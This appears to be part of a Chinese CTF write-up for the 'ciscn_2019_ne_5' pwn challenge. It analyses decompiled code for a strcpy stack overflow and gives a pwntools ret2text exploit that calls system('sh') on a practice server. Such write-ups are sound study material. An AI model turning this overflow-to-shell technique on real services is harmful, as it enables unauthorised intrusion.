@@ -527,3 +527,128 @@ puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
 骗人的，没有第二种方法
 ![alt text](image-15.png)
 网上的name是具有可执行权限的，而我查出来的是没有的
+
+## ciscn_2019_ne_5
+
+>知识点：ret2text
+
+![alt text](image-16.png)
+查看，发现开了NX保护，那shellcode就不用想了，然后放进IDA看看
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  int v4; // [esp+0h] [ebp-100h] BYREF
+  char src[4]; // [esp+4h] [ebp-FCh] BYREF
+  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
+  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
+  char v8[96]; // [esp+88h] [ebp-78h] BYREF
+  int *p_argc; // [esp+F4h] [ebp-Ch]
+
+  p_argc = &argc;
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  fflush(stdout);
+  *(_DWORD *)s1 = 48;
+  memset(v8, 0, sizeof(v8));
+  *(_DWORD *)src = 48;
+  memset(v6, 0, sizeof(v6));
+  puts("Welcome to use LFS.");
+  printf("Please input admin password:");
+  __isoc99_scanf("%100s", s1);
+  if ( strcmp(s1, "administrator") )
+  {
+    puts("Password Error!");
+    exit(0);
+  }
+  puts("Welcome!");
+  puts("Input your operation:");
+  puts("1.Add a log.");
+  puts("2.Display all logs.");
+  puts("3.Print all logs.");
+  printf("0.Exit\n:");
+  __isoc99_scanf("%d", &v4);
+  switch ( v4 )
+  {
+    case 0:
+      exit(0);
+      return result;
+    case 1:
+      AddLog(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 2:
+      Display(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 3:
+      Print();
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 4:
+      GetFlag(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    default:
+      result = sub_804892B(argc, argv, envp);
+      break;
+  }
+  return result;
+}
+```
+首先是密码严验证，已经给出了来了，没什么问题，然后看看三个功能
+```c
+int __cdecl AddLog(int a1)
+{
+  printf("Please input new log info:");
+  return __isoc99_scanf("%128s", a1);
+}
+int __cdecl Display(char *s)
+{
+  return puts(s);
+}
+int Print()
+{
+  return system("echo Printing......");
+}
+int __cdecl GetFlag(char *src)
+{
+  char dest[4]; // [esp+0h] [ebp-48h] BYREF
+  char v3[60]; // [esp+4h] [ebp-44h] BYREF
+
+  *(_DWORD *)dest = 48;
+  memset(v3, 0, sizeof(v3));
+  strcpy(dest, src);
+  return printf("The flag is your log:%s\n", dest);
+}
+```
+
+
+可以看出Addlog有溢出，因为a1就是主函数的src，空间很小，第三个提供了system函数，这时就可以考虑ret2text了，最后一个函数，这个实际上也是输出我们之前输入的，但是他有个步骤是拷贝到局部变量再输出局部变量，那么也就是说我们有机会栈溢出，计算一下大小，我们可以输入的有128也就是0x80，这个局部变量距离ebp为0x48，就可以栈溢出
+![alt text](image-17.png)
+但是找不到bin/sh，网上说换个参数sh也是阔以滴，我们先去找找sh，这时候我们用ROPgadget帮我们
+
+![alt text](image-18.png)
+exp:
+```python 
+from pwn import *
+from LibcSearcher import *
+r=remote('node5.buuoj.cn',28995)
+context(os = 'linux', arch = 'amd64', log_level = 'debug')
+elf=ELF('./2')
+r.recvuntil('password:')
+r.sendline('administrator')
+r.recvuntil('Exit\n:')
+r.sendline(str(1))
+main=0x08048722
+system_adr=0x080484D0
+sh_adr=0x080482ea
+payload=b'a'*(0x48+4)+p32(system_adr)+p32(main)+p32(sh_adr)
+r.sendline(payload)
+#r.recvuntil('password:')
+#r.sendline('administrator')
+r.recvuntil('Exit\n:')
+r.sendline(str(4))
+r.interactive()
+```
